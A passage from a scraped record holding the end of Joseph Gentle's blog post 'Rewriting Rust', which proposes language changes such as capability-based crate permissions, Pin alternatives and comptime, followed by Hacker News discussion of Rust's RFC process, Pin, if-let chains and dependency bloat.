2024 this is still impossible in stable rust. } Or with coroutines: coroutine fn numbers() -> impl Iterator { yield 1; yield 2; yield 3; } coroutine fn double>(inner: I) -> impl Iterator { for x in inner { yield x * 2; } } struct SomeStruct { // Suppose we want to store the iterator. We can name it directly: iterator: double::Continuation, } Or, say, take a function parameter but require that the parameter itself doesn't panic: fn foo(f: F) where F: NoPanic + FnOnce() -> String { ... } Yoshua Wuyts has an excellent talk & blog post going into way more detail about effects - why they're useful and how this could work. Compile-time Capabilities Most rust projects pull in an insane number of 3rd party crates. Most of these crates are small utility libraries - like the human-size crate which formats file sizes for human consumption. Great stuff! But unfortunately, all of these little crates add supply chain risk. Any of those authors could push out an update which contains malicious code - cryptolockering our computers, our servers or sneaking bad code into our binaries. I think this problem is similar to the problem of memory safety. Sure - its sometimes useful to write memory-unsafe code. The rust standard library is full of it. But rust's unsafe keyword lets authors opt in to potentially unsafe things. We only add unsafe blocks when its necessary. Lets do the same thing for privileged function calls - like reading and writing to and from the filesystem or the network. This is useful stuff, but its potentially dangerous. Developers should actively whitelist code that is allowed to call these functions. To implement this, first we want to add marker traits to all the security-sensitive functions in the standard library (opening a file from a string, exec, FFI, opening network connections, most unsafe functions that interact with raw pointers, and so on). So, for example, std::fs::write(path, contents) writes to an arbitrary path on disk with the credentials of the user. We add some #[cap(fs_write)] marker tag to the function itself, marking that this can only be called from code which is in some way trusted. The compiler automatically \"taints\" any other functions which call write in the entire call tree. Suppose I call a function in a 3rd party crate which needs the fs_write capability. In order to call that function, I need to explicitly whitelist that call. (Either by adding the permission explicitly in my Cargo.toml or maybe with an annotation at the call site). So, lets say the foo crate contains a function like this. The function will be marked (tainted) with the \"writes to filesystem\" tag: // In crate `foo`. // (this function is implicitly tagged with #[cap(fs_write)]) pub fn do_stuff() { std::fs::write(\"blah.txt\", \"some text\").unwrap(); } When I try to run that function from my code: fn main() { foo::do_stuff(); } The compiler can give me a nice rusty error, like this: Error: foo::do_stuff() writes to the local filesystem, but the `foo` crate has not been trusted with this capability in Cargo.toml. Tainted by this line in do_stuff: std::fs::write(\"blah.txt\", \"some text\").unwrap(); Add this to your Cargo.toml to fix: foo = { version = \"1.0.0\", allow_capabilities: [\"fs_write\"] } Obviously, most uses of unsafe would also require explicit whitelisting. Most crates I use - like human-size or serde don't need any special capabilities to work. So we don't need to worry so much about their authors \"turning evil\" and adding malicious code to our software. Reducing the supply chain risk from the 100 or so crates I currently transitively depend on down to just a few would be massive. This is a very simple, static way that capabilities could be introduced to Rust. But it might be possible & better to change privileged code to require an extra Capability parameter (some unit struct type). And heavily restrict how Capability objects can be instantiated. Eg: struct FsWriteCapability; impl FsWriteCapability { fn new() { Self } // Only callable from the root crate } // Then change std::fs::write's signature to this: pub fn write(path: Path, contents: &[u8], cap: FsWriteCapability) { ... } This requires more boilerplate, but its much more flexible. (And obviously, we'd also need to, somehow, apply a similar treatment to build.rs scripts and unsafe blocks.) The result of all of this is that utility crates become \"uncorruptable\". Imagine if crates.io is hacked and serde is maliciously updated to include with cryptolocker code. Today, that malicious code would be run automatically on millions of developer machines, and compiled into programs everywhere. With this change, you'd just get a compiler error. This is huge, and singlehandedly this one feature is probably worth the cost of forking rust. At least, to someone. (Anyone want to sponsor this work?) Pin, Move and Struct Borrows Feel free to skip this section if Pin & the borrow checker gives you a migraine. Pin in rust is a weird, complicated hack to work around a hole in the borrow checker. Its a band-aid from the land of bizzaro choices that only make sense when you need to maintain backwards compatibility at all costs. Its the reverse of the trait you actually want. It would make way more sense to have a Move marker trait (like Copy) indicating objects which can move. But Pin isn't an actual trait. There's only Unpin (double negative now) and !Unpin - which is not-not-not-Move. For example impl !Unpin for PhantomPinned. Is !Unpin the same as Pin? Uhhhh, ... No? Because .. reasons? I get an instant headache when I think about this stuff. Here's the documentation for Unpin if you want to try your luck. Pin only applies to reference types. If you read through code which uses Pin a lot, you'll find unnecessary Box-ing of values everywhere. For example, in tokio, or helper libraries like ouroboros, asynctrait and selfcell. The pain spreads. Any function that takes a pinned value needs the value wrapped using some horrible abomonation like Future::poll(self: Pin, ..). And then you need to figure out how to read the actual values out using projections, which are so complicated there are multiple crates for dealing with them. The pain cannot be confined. It spreads outwards, forever, corrupting everything. I swear, it took more effort to learn pinning in rust than it took me to learn the entire Go programming language. And I'm still not convinced I'm totally across it. And I'm not alone. I've heard the Fuchsia operating system project abandoned Rust for C++ in some parts because of how impossibly complex Pin makes everything. Why is Pin needed, anyway? We can write rust functions like this: fn main() { let x = vec![1,2,3]; let y = &x; //drop(x); // error[E0505]: cannot move out of `x` because it is borrowed dbg!(y); } All variables in a rust function are actually, secretly in one of 3 different states: Normal (owned) Borrowed Mutably borrowed While a variable is borrowed (y = &x), you can't move, mutate or drop the variable. In this example, x is put into a special \"borrowed\" state throughout the lifetime of y. Variables in the \"borrowed\" state are pinned, immutable, and have a bunch of other constraints. This \"borrowed state\" is visible to the compiler, but its completely invisible to the programmer. You can't tell that something is borrowed until you try to compile your program. (Aside: I wish Rust IDEs made this state visible while programming!) But at least this program works. Unfortunately, there's no equivalent to this for structs. Lets turn the function async: async fn foo() { let x = vec![1,2,3]; let y = &x; some_future().await; dbg!(y); } When you compile this, the compiler creates a hidden struct for you, which stores the suspended state of this function. It looks something like this: struct FooFuture { x: Vec, y: &'_ Vec, } impl Future for FooFuture { ... } x is borrowed by y. So it needs to be placed under all the constraints of a borrowed variable: It must not move in memory. (It needs to be Pinned) It must be immutable We can't take mutable references to x (because of the & xor &mut rule). x must outlive y. But there's no syntax for this. Rust doesn't have syntax to mark a struct field as being in a borrowed state. And we can't express the lifetime of y. Remember: the rust compiler already generates and uses structs like this whenever you use async functions. The compiler just doesn't provide any way to write code like this ourselves. Lets just extend the borrow checker and fix that! I don't know what the ideal syntax would be, but I'm sure we can come up with something. For example, maybe y gets declared as a \"local borrow\", written as y: &'Self::x Vec. The compiler uses that annotation to figure out that x is borrowed. And it puts it under the same set of constraints as a borrowed variable inside a function. This would also let you work with self-referential structs, like an Abstract Syntax Tree (AST) in a compiler: struct Ast { source: String, ast_nodes: Vec, } This syntax could also be adapted to support partial borrows: impl Foo { fn get_some_field(&'a self) -> &'a::some_field usize { &self.some_field } } This isn't a complete solution. We'd also need a Move marker trait, to replace Pin. Any struct with borrowed fields can't be Moved - so it wouldn't have impl Move. I'd also consider a Mover trait, which would allow structs to intelligently move themselves in memory. Eg: trait Mover { // Something like that. unsafe fn move(from: *Self, to: MaybeUninit); } We'd also need a sane, safe way to construct structs like this in the first place. I'm sure we can do better than MaybeUninit. Miguel Young de la Sota gave a fantastic talk a few years ago talking about Move in rust. But I think it would be much more \"rusty\" to lean on the borrow checker instead. If you ask me, Pin is a dead end solution. Rust already has a borrow checker. Lets use it for structs. Comptime This is a hot opinion. I haven't spent a lot of time with zig, but at least from a distance I adore comptime. In the rust compiler we essentially implement two languages: Rust and the Rust Macro language. (Well, arguably there's 3 - because proc macros). The Rust programming language is lovely. But the rust macro languages are horrible. But, if you already know rust, why not just use rust itself instead of sticking another language in there? This is the genius behind Zig's comptime. The compiler gets a little interpreter tacked on that can run parts of your code at compile time. Functions, parameters, if statements and loops can all be marked as compile-time code. Any non-comptime code in your block is emitted into the program itself. I'm not going to explain the feature in full here. Instead, take in just how gorgeous this makes Zig's std print function. Its entirely implemented using comptime. So when you write this in zig: pub fn main() void { print(\"here is a string: '{s}' here is a number: {}\", .{ a_string, a_number }); } print takes the format string as a comptime parameter, and parses it within a comptime loop. Aside from a couple keywords, the function is just regular zig code - familiar to anyone who knows the language. It just gets executed within the compiler. And the result? It emits this beauty: pub fn print(self: *Writer, arg0: []const u8, arg1: i32) !void { try self.write(\"here is a string: '\"); try self.printValue(arg0); try self.write(\"' here is a number: \"); try self.printValue(arg1); try self.write(\"\"); try self.flush(); } Read the full case study for more details. In comparison, I tried to look up how rust's println!() macro is implemented. But println! calls some secret format_args_nl function. I assume that function is hardcoded in the rust compiler itself. Its not a great look when even the rust compiler authors don't want to use rust's macro language. Weird little fixes Bonus round time. Here's some other little \"nits\" I'd love to fix while we're at it: impl for Range. If you know, you know. Fix derive with associated types. Full example here. Make if-let expressions support logical AND. Its so simple, so obvious, and so useful. This should work: // Compile error! We can't have nice things. if let Some(x) = some_var && some_expr { } You can sort of work around this problem today as below, but its awkward to write, hard to read and the semantics are different from how normal if statements work because it lacks short-circuit evaluation. // check_foo() will run even if some_var is None. if let (Some(x), true) = (some_var, check_foo()) { ... } Full example here. Rust's ergonomics for raw pointers are also uniquely horrible. When I work with unsafe code, my code should be as easy to read & write as humanly possible. But the rust compiler seems intent on punishing me for my sins. For example, if I have a reference to a struct in rust, I can write myref.x. But if I have a pointer, rust insists that I write (*myptr).x or, worse: (*(*myptr).p).y. Horrible. Horrible and entirely counterproductive. Unsafe code should be clear. I'd also change all the built in collection types to take an Allocator as a constructor argument. I personally don't like Rust's decision to use a global allocator. Explicit is better than implicit. Closing thoughts Thats all the ideas I have. I mean, async needs some love too. But there's so much to say on the topic that async deserves a post of its own. Unfortunately, most of these changes would be incompatible with existing rust. Even adding security capabilities would require a new rust edition, since it introduces a new way that crates can break semver compatibility. A few years ago I would have considered writing RFCs for all of these proposals. But I like programming more than I like dying slowly in the endless pit of github RFC comments. I don't want months of work to result in yet another idea in rust's landfill of unrealised dreams. Maybe I should fork the compiler and do it myself. Urgh. So many projects. If I could live a million lifetimes, I'd devote one to working on compilers. Joseph Gentle http://josephg.com",
    "commentLink": "https://news.ycombinator.com/item?id=41654871",
    "commentBody": "Rewriting Rust (josephg.com)319 points by yett 13 hours agohidepastfavorite346 comments gary17the 10 hours ago> The rust RFC process is a graveyard of good ideas. I actually have quite an opposite view: I think the Rust core team is 100% correct to make it very hard to add new \"features\" to the PL, in order to prevent the \"language surface\" from being bloated, inconsistent and unpredictable. I've seen this happen before: I started out as a Swift fan, even though I have been working with Objective-C++ for years, considered it an awesome powerhouse and I did not really need a new PL for anything in particular in the world of iOS development. With time, Swift's insistence on introducing tons of new language \"features\" such as multiple, redundant function names, e.g., \"isMultiple(of:)\", multiple rules for parsing curly braces at al. to make the SwiftUI declarative paradigm possible, multiple rules for reference and value types and mutability thereof, multiple shorthand notations such as argument names inside closures, etc. - all that made me just dump Swift altogether. I would have to focus on Swift development exclusively just to keep up, which I was not willing to do. Good ideas are \"dime a dozen\". Please keep Rust as lean as possible. reply josephg 9 hours agoparentAuthor here. I hear what you're saying. But there's lots of times while using rust where the language supports feature X and feature Y, but the features can't be used together. For example, you can write functions which return an impl Trait. And structs can contain arbitrary fields. But you can't write a struct which contains a value returned via impl Trait - because you can't name the type. Or, I can write if a && b. And I can write if let Some(x) = x. But I can't combine those features together to write if let Some(x) = x && b. I want things like this to be fixed. Do I want rust to be \"bigger\"? I mean, measured by the number of lines in the compiler, probably yeah? But measured from the point of view of \"how complex is rust to learn and use\", feature holes make the language more complex. Fixing these problems would make the language simpler to learn and simpler to use, because developers don't have to remember as much stuff. You can just program the obvious way. Pin didn't take much work to implement in the standard library. But its not a \"lean\" feature. It takes a massive cognitive burden to use - to say nothing of how complex code that uses it becomes. I'd rather clean, simple, easy to read rust code and a complex borrow checker than a simple compiler and hard to use language. reply withoutboats3 8 hours agorootparentThese features are slow to be accepted for good reasons, not just out of some sort of pique. For example, the design space around combining `if let` pattern matching with boolean expressions has a lot of fraught issues around the scoping of the bindings declared in the pattern. This becomes especially complex when you consider the `||` operator. The obvious examples you want to use work fine, but the feature needs to be designed in such a way that the language remains internally consistent and works in all edge cases. > Pin didn't take much work to implement in the standard library. But its not a \"lean\" feature. It takes a massive cognitive burden to use - to say nothing of how complex code that uses it becomes. I'd rather clean, simple, easy to read rust code and a complex borrow checker than a simple compiler and a horrible language. Your commentary on Pin in this post is even more sophomoric than the rest of it and mostly either wrong or off the point. I find this quite frustrating, especially since I wrote detailed posts explaining Pin and its development just a few months ago. https://without.boats/blog/pin/ https://without.boats/blog/pinned-places/ reply senorrib 7 hours agorootparentI think you just proved his point on how hard it is to understand and correctly use Pin. reply withoutboats3 6 hours agorootparentI agree with that assessment of Pin. That's why the second post I linked to presents a set of features that would make it as easy to use as mutability (pinning is really the dual of immutability: an immutable place cannot be assigned into, whereas a pinned place cannot be moved out of). reply oneshtein 6 hours agorootparentprevPinned is life time, similar to 'static, but written as Pin!() for an unknown reason. reply josephg 7 hours agorootparentprev> The obvious examples you want to use work fine, but the feature needs to be designed in such a way that the language remains internally consistent and works in all edge cases. True. How long should that process take? A month? A year? Two years? I ask because this feature has been talked about since I started using rust - which (I just checked) was at the start of 2017. Thats nearly 8 years ago now. 6 years ago this RFC was written: https://rust-lang.github.io/rfcs/2497-if-let-chains.html - which fixes my issues. But it still hasn't shipped. Do I have too high expectations? Is 6 years too quick? Maybe, a decade is a reasonable amount of time to spend, to really talk through the options? Apparently 433 people contributed to Rust 1.81. Is that not enough people? Do we need more people, maybe? Would that help? Yes, I do feel piqued by the glacial progress. I don't care about the || operator here - since I don't have any instinct for what that should do. And complex match expressions are already covered by match, anyway. Rust doesn't do the obvious thing, in an obvious, common situation. If you ask me, this isn't the kind of problem that should take over 6 years to solve. > Your commentary on Pin in this post is even more sophomoric than the rest of it and mostly either wrong or off the point. I find this quite frustrating, especially since I wrote detailed posts explaining Pin and its development just a few months ago. If I'm totally off base, I'd appreciate more details and less personal insults. I've certainly given Pin an honest go. I've used Pin. I've read the documentation, gotten confused and read everything again. I've struggled to write code using it, given up, then come back to it and ultimately overcame my struggles. I've boxed so many things. So many things. The thing I've struggled with the most was writing a custom async stream wrapper around a value that changes over time. I used tokio's RwLock and broadcast channel to publish changes. My Future needed a self-referential type (because I need to hold a RwLockGuard across an async boundary). So I couldn't just write a simple, custom struct. But I also couldn't use an async function, because I needed to implement the stream trait. As far as I can tell, the only way to make that code work was to glue async fn and Futures together in a weird frankenstruct. (Is this a common pattern? For all the essays about Pin and Future out there, I haven't heard anyone talk about this.) I got the idea from how tokio implements their own stream adaptor for broadcast streams[1]. And with that, I got this hairy piece of code working. But who knows? I've written hundreds of lines of code on top of Pin. Not thousands. Maybe I still don't truly get it. I've read plenty of blog posts, with all sorts of ideas about Pin being about a place, or about a value, or a life philosophy. But - yes, I haven't yet, also read the 9000 words of essay you linked. Maybe if I do so I'll finally, finally be enlightened. But I doubt it. I think Pin is hard. If it was simple, you wouldn't have written 9000 words talking about it. As you say: > Unfortunately, [pin] has also been one of the least accessible and most misunderstood elements of async Rust. Pin foists all its complexity onto the programmer. And for that reason, I think its a bad design. Maybe it was the best option at the time. But if we're still talking about it years later - if its still confusing people so long after its introduction - then its a bad part of the language. I also suspect there are way simpler designs which could solve the problems that pin solves. Maybe I'm an idiot, and I'm not the guy who'll figure those designs out. But in that case, I'd really like to inspire smarter people than me to think about it. There's gotta be a simpler approach. It would be incredibly sad if people are still struggling with Pin long after I'm dead. [1] https://github.com/tokio-rs/tokio/blob/master/tokio-stream/s... reply withoutboats3 6 hours agorootparentI don't deny that Pin is complicated to use as it stands (in fact that is the entire thrust of my blog posts!), just that there is some magical easier solution involving Move and changes to the borrow checker. You wrote something on the back of a napkin and you imagine its better, whereas I actually had to ship a feature that works. The state of async Rust is not better because no one hired me to finish it past the MVP. I have solutions to all of your problems (implementing a stream with async/await, making Pin easier to use, etc). Since I am not working on it the project has spun its wheels on goofy ideas and gotten almost no work done in this space for years. I agree this is a bad situation. I've devoted a lot of my free time in the past year to explaining what I think the project should do, and its slowly starting to move in that direction. My understanding is that if let chaining is stalled because some within the project want to pretend there's a solution where a pattern matching operator could actually be a boolean expression. I agree that stalling things forever on the idea that there will magically be a perfect solution that has every desirable property in the future is a bad pattern of behavior that the Rust project exhibits. Tony Hoare had this insightful thing to say: > One way is to make it so simple that there are obviously no deficiencies and the other way is to make it so complicated that there are no obvious deficiencies. > The first method is far more difficult. It demands the same skill, devotion, insight, and even inspiration as the discovery of the simple physical laws which underlie the complex phenomena of nature. It also requires a willingness to accept objectives which are limited by physical, logical, and technological constraints, and to accept a compromise when conflicting objectives cannot be met. No committee will ever do this until it is too late. reply josephg 5 hours agorootparentThankyou for all your hard work on this. I'm sorry my post is, in many ways, dismissive of the huge amount of work that you and others have poured into rust, async, Pin, explaining Pin in detail over and over again, and all of the other things I take for granted in the compiler constantly. But appreciation does little to temper my frustration. Watching the rust project spin its wheels has dulled any enthusiasm I might have once had for its open, consensus based processes. I could get involved - but I worry I'd be yet another commenter making long issue threads even longer. I don't think Rust has a \"not enough cooks in the kitchen\" shaped problem. I love that quote. I agree with it - at some point, like with Pin and the 'foo.await' vs 'await foo' discussion - you just have to pick an answer, any answer, and move forward. But the siren song of that \"simple and elegent\" solution still calls. Alan Kay once made a similar observation. He pointed out that it took humanity thousands of years (and two geniuses) to invent calculus. And now we teach it to 8th grade children. How remarkable. Clearly, the right point of view is worth 50 IQ points. I look forward to reading your blog posts on the topic. I suspect there's lots of workable solutions out there in the infinite solution space. Research is always harder and slower than I think it should be. And this is very much a research question. You seem very convinced that replacing Pin with Move would be a mistake. Maybe! I wouldn't be surprised if the Move vs Pin question is a red herring. I suspect there's an entirely different approach which would work much better - something like, as I said in my post, attacking the problem by changing the borrow checker. Something like that. Maybe that wouldn't be viable for rust. Thats fine. There will be more languages following in its footsteps. I want them to be as good as possible. And I swear, there's a better answer here somewhere. I can feel it. reply jcranmer 3 hours agorootparentprev> True. How long should that process take? A month? A year? Two years? If you want a feature that everyone complains about, like Pin or async rust, yes, that is how long that process should take. If you don't want a feature that everyone uses as their stock example for why language designers are drooling morons, and the feature has any amount of complexity to it, then the process should probably take over a decade. There's a commonality to the features you're complaining about, and it's things where the desire to push a MVP that satisfied some, but not all, use cases overrode the time necessary to fully understand the consequences of decisions not just to implement the feature but its necessary interactions with other features, present and future. I do appreciate the irony, though, of you starting about complaining about Rust moving too slowly before launching into detailed criticism of a feature that most agree is (at least in part) the result of Rust moving too quickly. reply wokwokwok 4 hours agorootparentprev> The obvious examples you want to use work fine, but the feature needs to be designed in such a way that the language remains internally consistent and works in all edge cases. ?? Then why did the language team put it on the 2024 roadmap? Am I looking at something different? (Specifically on under the 'Express yourself more easily' (1) goal, which links to the RFC issue (2)). It certainly looks like the implementation is both complete and unblocked, and actively used. It looks more like the issue is (despite being put on the roadmap and broadly approved as a feature), being argued about because of the alternative proposal for 'is' syntax. ie. If you want to generalize then yes, there are features which are difficult to implement (yeah, I'll just make a Move trait... yeah... No. It's not that easy). BUT. That's not a problem. A lot of clever folk can work through issues like that and find solutions for that kind of problem. The real problem is that RCFs like this end up in the nebulous 'maybe maybe' bin, where they're implemented, have people who want them, have people who use them, have, broadly the approval of the lang team (It's on the roadmap). ...but then, they sit there. For months. Or years. While people argue about it. It's kind of shit. If you're not going to do it, make the call, close the RFC. Say \"we're not doing this\". Bin the code. Or... merge it into stable. Someone has to make the call on stuff like this, and it's not happening. This seems to happen to a fair few RFCs to a greater or less extent, but this one is particularly egregious in my opinion. [1] - https://lang-team.rust-lang.org/roadmaps/roadmap-2024.html#t... [2] - https://github.com/rust-lang/rust/issues/53667 reply adwn 7 hours agorootparentprev> Your commentary on Pin in this post is even more sophomoric than the rest of it and mostly either wrong or off the point. I find this quite frustrating, especially since I wrote detailed posts explaining Pin and its development just a few months ago. To me, this sounds as if the Pin concept is so difficult to understand that it's hard to even formulate correct criticism about it. I get that Pin serves a critical need related to generators and async, and in that it was a stroke of genius. But you as the creator of Pin might not be the right person to judge how difficult Pin is for the more average developers among us. reply withoutboats3 6 hours agorootparentIf you actually read my posts you would see that I acknowledge and analyze the difficulty with using Pin and propose a solution which makes it much easier to deal with. My understanding is that the Rust project is now pursuing a solution along the lines of what I suggested in these posts. reply adastra22 7 hours agorootparentprevA properly designed feature shouldn’t require an entire blog post, let alone multiple, to understand. reply cogman10 3 hours agorootparentI disagree. Some features are more complex than others and design has little to do with that complexity. Async is a good example of a complex feature that needs a fairly detailed blog post to understand the nuances. Pretty much any language with coroutines of some sort will have 1 or many blog posts going into great detail explaining exactly how those things work. Similarly, assuming Rust added HKT, that would also require a series of blog posts to explain as the concept itself is foreign to most programmers. reply craftkiller 1 hour agorootparentprevBasically every programming concept requires the equivalent of a blog post to understand. Remember learning pointers? Remember learning inheritance? Remember literally every programming tutorial you ever read when you were starting out? I don't understand why people reach a certain level of proficiency and then declare \"I shouldn't have to work to learn anything ever again!\". reply dartos 6 hours agorootparentprevSo… all programming languages are not properly designed? People usually need to study for months to be able to use their first one. Sometimes you need knowledge to understand things. reply gary17the 8 hours agorootparentprevI think it would be helpful to clearly distinguish between PL simplification (e.g., \"if let Some(x) = x, x == 42 {}\") and convenience-driven PL expansion (e.g., \"let @discardable lhs = rhs ?? 0;\"). In case of the former, I'm with you. In case of the latter, I'm not. Rust likely isn't meant to be a tool that is easy to learn at all costs (since the borrow checker does exist, after all). Rust is, IMvHO, supposed to be like vi: hard to learn and easy to use :). reply adastra22 7 hours agorootparentWe should strive for easy to learn, easy to use. reply Measter 3 hours agorootparentThough we should also accept that some things are just hard. Though that's not to say that we should give up on trying to make them as easy to learn and use as possible. reply valenterry 8 hours agorootparentprevYeah, I agree wholeheartedly with that. This is also what I really dislike in many languages. You should have a look at Scala 3. Not saying that I'm perfectly happy with the direction of the language - but Scala really got those foundations well and made it so that it has few features but they are very powerful and can be combined very well. Rust took a lot of inspiration from Scala for a reason - but then Rust wants to achieve zero-cost abstraction and do high-performance, so it has to make compromises accordingly for good reasons. Some of those compromises affect the ergonomics of the language unfortunately. reply nindalf 8 hours agorootparentprevIt is easier to make big breaking changes when there are fewer users, for sure. I think what you ignore is both the progress that is being made and how difficult it is to make that progress while maintaining a stable language that works for all the existing users. I'll give an example - async traits. On the surface it seems fairly simple to add? I can say async fn, but for the longest time I couldn't say async fn inside a trait? It took years of work to solve all the thorny issues blocking this in a stable, backwards compatible way and finally ship it [1]. There is still more work to be done but the good news is that they're making good progress here! You pointed out one feature that Rust in Linux needs (no panics), but there are several more [2]. That list looks vast, because it is. It represents years of work completed and several more years of work in the Rust and Rust for Linux projects. It might seem reasonable to ask why we can't have it right now, but like Linus said recently \"getting kernel Rust up to production levels will happen, but it will take years\". [3] He also pointed out that the project to build Linux with clang took 10 years, so slow progress shouldn't discourage folks. The important thing is that the Rust project maintainers have publicly committed to working on it right now - \"For 2024H2 we will work to close the largest gaps that block support (for adopting Rust in the kernel)\". [4] You dream of a language that could make bold breaking changes and mention Python 2.7 in passing. The Python 2/3 split was immensely painful and widely considered to be a mistake, even among the people who had advocated for it. The Rust project has a better mechanism for small, opt-in, breaking changes - the Edition system. That has worked well for the last 9 years and has led to tremendous adoption - more than doubling every year [5]. IMO there's no reason to fix what isn't broken. I guess what I'm saying is, patience is the key here. Each release might not bring much because it only represents 6 weeks of work, but the cumulative effect of a year's worth of changes is pretty fantastic. Keep the faith. [1] - https://blog.rust-lang.org/2023/12/21/async-fn-rpit-in-trait... [2] - https://github.com/Rust-for-Linux/linux/issues/2 [3] - https://lwn.net/SubscriberLink/991062/b0df468b40b21f5d/ [4] - https://blog.rust-lang.org/2024/08/12/Project-goals.html [5] - https://lib.rs/stats reply devit 8 hours agorootparentprevYou can make the struct generic on the type to have a field being an impl Trait type. reply josephg 8 hours agorootparentI know. Sometimes that can work. But that choice will ripple out to cause all sorts of other complications throughout your codebase. Now you have a Struct. How do you pass one of these structs as a parameter to another function? Do you need to make that function generic over all T? How do you embed that into another struct, in turn? Do you put generic arguments everywhere? And so on. Fundamentally, I don't want my type to be generic over all implementations. I want a concrete type. I want the type returned by one specific, often private, function. But, nope. Not today. Maybe with TAIT, whenever that ships. reply hiimkeks 8 hours agoparentprevI general I agree, but we are also in the paradoxical situation that generic associated constants in traits are stable, but you can't actually use them as constants. You can't use them as const generics for other types, and you can't use them for array lengths. I'd argue that this makes them pretty useless: if you just want a value that you can use like any other, then you can define a function that returns it and be done with it. Now we have another way to do it, and in theory it could do more, but that RFC has been stale for several years, nobody seems to be working on it, and I believe it's not even in nightly. If the support would actually be good, we could just get rid of all the support crates we have in cryptography libraries (like the generic_array and typenum crates). That said, I agree that the Rust team should be careful about adding features. reply nicce 8 hours agorootparent> Now we have another way to do it, and in theory it could do more, but that RFC has been stale for several years, nobody seems to be working on it, and I believe it's not even in nightly. What is this way? I have been fighting with this problem for quite some time recently. reply kazinator 4 hours agoparentprevIt's easier to write RFCs than to implement them, and there are more people who can write RFCs. At any popularity level, you have more of the former. Therefore, an RFC queue will always look like a graveyard of good ideas, even if 100% of the queued ideas are being accepted and eventually worked on, simply due to the in/out differential rate. If you want an edge over the people who are writing RFCs, don't write an RFC. Write a complete, production-ready implementation of your idea, with documentation and test cases, which can be cleanly merged into the tree. reply JoshTriplett 4 hours agorootparent> If you want an edge over the people who are writing RFCs, don't write an RFC. Write a complete, production-ready implementation of your idea, with documentation and test cases, which can be cleanly merged into the tree. Please by all means provide an implementation, but do write the RFC first. (Or in some cases smaller processes, such as the ACP process for a small standard-library addition.) Otherwise you may end up wasting a lot of effort, or having to rewrite the implementation. We are unlikely to accept a large feature, or even a medium feature, directly from a PR without an RFC. reply estebank 1 hour agorootparentI've noticed that having even a minimal implementation helps a lot to inform the RFC: some details are non-obvious until you are either forced to clamp down behavior or have tried to use the feature. The RFC discussion doesn't always surface these. I've also been thinking that we should go over our stabilized RFCs and add an appendix to all of them documenting how the current implementation diverges from the original proposal. reply JoshTriplett 10 minutes agorootparentAbsolute agreement on both counts. reply formerly_proven 10 hours agoparentprev> Please keep Rust as lean as possible. Alternatively: Rust is already the Wagyu of somewhat-mainstream PLs, don't keep adding fat until it's inedible. reply goodpoint 8 hours agoparentprev> Good ideas are \"dime a dozen\". Please keep Rust as lean as possible. Good ideas are rare and precious by definition. reply gary17the 8 hours agorootparentI think it would be helpful to clearly distinguish between \"good ideas\" and \"excellent ideas\". It's relatively easy in the complex art of programming to come up with a dozen good ideas. It seems very hard in the complex art of programming to come up with even one truly excellent idea. reply dist1ll 12 hours agoprevI think the dependency situation is pretty rough, and very few folks want to admit it. An example I recently stumbled upon: the cargo-watch[0] crate. At its core its a pretty simple app. I watches for file changes, and re-runs the compiler. The implementation is less than 1000 lines of code. But what happens if I vendor the dependencies? It turns out, the deps add up to almost 4 million lines of Rust code, spread across 8000+ files. For a simple file-watcher. [0] https://crates.io/crates/cargo-watch reply alexvitkov 10 hours agoparentThat's what inevitably happens when you make transitive dependencies easy and you have a culture of \"if there's a library for it you must use it!\" C/C++ are the only widely used languages without a popular npm-style package manager, and as a result most libraries are self-contained or have minimal, and often optional dependencies. efsw [1] is a 7000 lines (wc -l on the src directory) C++ FS watcher without dependencies. The single-header libraries that are popular in the game programming space (stb_* [2], cgltf [3], etc) as well as of course Dear ImGui [4] have been some of the most pleasant ones I've ever worked with. At this point I'm convinced that new package managers forbidding transitive dependencies would be an overall net gain. The biggest issue are large libraries that other ones justifiably depend on - OpenSSL, zlib, HTTP servers/clients, maybe even async runtimes. It's by no means an unsolvable problem, e.g. instead of having zlib as a transitive dependency, it could: 1. a library can still hard-depend on zlib, and just force the user to install it manually. 2. a library can provide generic compress/decompress callbacks, that the user can implement with whatever. 3. the compress/decompress functionality can be make standard [1] https://github.com/SpartanJ/efsw [2] https://github.com/nothings/stb [3] https://github.com/jkuhlmann/cgltf [4] https://github.com/ocornut/imgui reply lifthrasiir 10 hours agorootparent> The single-header libraries that are popular in the game programming space (stb_* [2], cgltf [3], etc) as well as of course Dear ImGui have been some of the most pleasant ones I've ever worked with. The mainstream game programming doesn't use C at all. (Source: I had been a gamedev for almost a decade, and I mostly dealt with C# and sometimes C++ for low-level stuffs.) Even C++ is now out of fashion for at least a decade, anyone claiming that C++ is necessary for game programming is likely either an engine developer---a required, but very small portion of all gamedevs---or whoever haven't done significant game programming recently. Also, the reason that single-header libraries are rather popular in C is that otherwise they will be so, SO painful to use by the modern standard. As a result, those libraries have to be much more carefully designed than normal libraries either in C or other languages and contribute to their seemingly higher qualities. (Source: Again, I have written sizable single-header libraries in C and am aware of many issues from doing so.) I don't think this approach is scalable in general. reply raverbashing 6 hours agorootparent> The mainstream game programming doesn't use C at all. (Source: I had been a gamedev for almost a decade Game programming changed a lot, parent is talking about stuff older than 10 yrs There was a lot of PC gaming in C/C++, and \"Engine\" were developed together with games for the most part. Think all the Doom and Quake saga That's what he's talking about reply mike_hearn 10 hours agorootparentprev> as a result most libraries are self-contained or have minimal, and often optional dependencies If you ignore the OS, then sure. Most C/C++ codebases aren't really portable however. They're tied to UNIX, Windows or macOS, and often some specific version range of those, because they use so many APIs from the base OS. Include those and you're up to millions of lines too. reply Measter 2 hours agorootparentprevHaving a quick look at efsw, it depends on both libc and the windows API, both are huge dependencies. The Rust bindings for libc come to about 122 thousand lines, while the winapi crate is about 180 thousand lines. [Edit] And for completeness, Microsoft's Windows crate is 630 thousand lines, though that goes way beyond simple bindings, and actually provides wrappers to make its use more idiomatic. reply xpe 8 hours agorootparentprev> That's what inevitably happens when you make transitive dependencies easy and you have a culture of \"if there's a library for it you must use it!\" 1. This doesn't mean that C++'s fragmented hellscape of package management is a good thing. 2. \"inevitably\"? No. This confuses the causation. 3. This comment conflates culture with tooling. Sure, they are related, but not perfectly so. reply xpe 56 minutes agorootparentprev> At this point I'm convinced that new package managers forbidding transitive dependencies would be an overall net gain. Composition is an essential part of software development, and it crosses package boundaries. How would banishing inter-package composition be a net gain? reply the_gipsy 9 hours agorootparentprev> a library can provide generic compress/decompress callbacks, that the user can implement with whatever. This only works for extremely simple cases. Beyond toy example, you have to glue together two whole blown APIs with a bunch of stuff not aligning at all. reply cogman10 7 hours agoparentprevThis is a natural and not really scary thing. All code is built on mountains of dependencies that by their nature will do more than what you are using them for. For example, part of cargo watch is to bring in a win32 API wrapper library (which is just autogenerated bindings for win32 calls). Of course that thing is going to be massive while watch 